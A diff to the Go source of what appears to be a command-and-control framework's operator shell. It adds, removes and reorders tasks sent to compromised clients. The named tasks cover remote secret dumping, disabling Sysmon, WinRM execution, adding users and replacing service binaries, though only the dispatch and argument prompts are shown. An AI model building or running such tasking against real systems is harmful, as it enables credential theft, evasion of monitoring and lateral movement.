@@ -708,12 +708,12 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskSimple(c, clientId, command)
 	case "dump-secrets-remote":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <domain> <username> <password>")
-	case "enum-users":
-		PrepareTaskSimple(c, clientId, command)
-	case "enum-groups":
-		PrepareTaskSimple(c, clientId, command)
-	case "enum-domain":
-		PrepareTaskSimple(c, clientId, command)
+	//case "enum-users": // moved to enum local
+	//	PrepareTaskSimple(c, clientId, command)
+	//case "enum-groups":
+	//	PrepareTaskSimple(c, clientId, command)
+	//case "enum-domain":
+	//	PrepareTaskSimple(c, clientId, command)
 	case "admin-check":
 		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine>: ")
 	case "disable-sysmon":
@@ -805,7 +805,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "list-pipes":
 		PrepareTaskSimple(c, clientId, command)
 	case "winrm-exec":
-		PrepareTaskWithArgs(c, clientId, command, "<Domain> <Username> <Password> <Host> <Port> <Command> <SSL 1,0 >: ")
+		PrepareTaskWithArgs(c, clientId, command, "<Host> <Port> <Command> <SSL 1,0>: ")
 	case "add-user":
 		PrepareTaskWithArgs(c, clientId, command, "<user> <pass>: ")
 	case "remove-user":
@@ -814,10 +814,14 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
 	case "remove-user-group":
 		PrepareTaskWithArgs(c, clientId, command, "<user> <group>: ")
-	case "enum-logons":
-		PrepareTaskSimple(c, clientId, command)
+	//case "enum-logons": moved to enum-local
+	//	PrepareTaskSimple(c, clientId, command)
 	case "powershell":
 		PrepareTaskWithArgs(c, clientId, command, "<Get-ChildItem -force -something -test>: ")
+	case "enum-local":
+		PrepareTaskSimple(c, clientId, command)
+	case "modify-service-binary":
+		PrepareTaskWithArgs(c, clientId, command, "<remoteMachine> <serviceName> <serviceBinaryPath>: ")
 	default:
 		c.Println("Task not found.")
 	}
